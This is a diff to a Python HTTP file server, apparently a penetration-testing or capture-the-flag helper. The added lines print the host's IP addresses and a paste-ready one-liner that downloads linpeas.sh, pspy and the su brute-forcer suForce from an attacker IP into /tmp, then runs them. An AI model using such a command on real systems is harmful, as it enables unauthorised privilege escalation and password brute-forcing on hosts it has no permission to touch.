@@ -17,6 +17,12 @@ def run(server_class=HTTPServer, handler_class=ExtendedHTTPRequestHandler, port=
     server_address = ('', port)
     httpd = server_class(server_address, handler_class)
     print(f"Serving HTTP on port {port} (GET to list/download, POST to upload)...")
+    try:
+        ips = os.popen("ips").read()
+        print(ips)
+    except:
+        pass
+    print("target=IP;cd /tmp;wget $target/linpeas.sh;wget $target/pspy;wget $target/suForce;chmod +x *;./linpeas.sh")
     httpd.serve_forever()
 
 if __name__ == '__main__':
